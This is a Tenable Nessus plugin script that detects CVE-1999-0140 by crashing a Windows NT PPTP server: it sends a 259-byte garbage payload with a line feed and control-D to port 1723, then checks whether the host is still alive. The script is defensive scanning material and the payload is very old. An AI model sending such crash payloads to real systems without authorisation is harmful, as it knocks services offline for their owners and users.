#
# (C) Tenable Network Security, Inc.
#

include( 'compat.inc' );

if(description)
{
  script_id(10313);
  script_version ("$Revision: 1.18 $");
  script_cve_id("CVE-1999-0140");
  script_bugtraq_id(2111);
  script_xref(name:"OSVDB", value:"55332");

  script_name(english:"Microsoft Windows PPTP Server Malformed Control Packet Remote DoS (179107)");
  script_summary(english:"Crashes the remote PPTP server");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote PPTP server is vulnerable to denial of service.'
  );

  script_set_attribute(
    attribute:'description',
    value:"We could make the remote PPTP host crash by telnetting to port 1723, and sending
garbage followed by the character ^D. (control-d).

An attacker may use this flaw to deny service."
  );

  script_set_attribute(
    attribute:'solution',
    value: "Install WindowsNT SP5."
  );

  script_set_attribute(
    attribute:'see_also',
    value:'http://support.microsoft.com/default.aspx?scid=kb;EN-US;179107'
  );

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P'
  );

  script_end_attributes();


  script_category(ACT_KILL_HOST);
  script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
  script_family(english:"Windows");
  script_require_ports(1723);
  script_require_keys("Settings/ParanoidReport");
  exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
if (report_paranoia < 2) exit(0);

port = 1723;
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {

  # Ping the host _before_

  start_denial();

  # Send the garbage

  c = crap(260);
  c[256]=raw_string(10);
  c[257]=raw_string(4);
  c[258]=0;
  send(socket:soc, data:c, length:259);
  close(soc);

  # Is is dead ?
  alive = end_denial();
  if(!alive)
  {
    security_warning(port);
    set_kb_item(name:"Host/dead", value:TRUE);
  }
 }
}
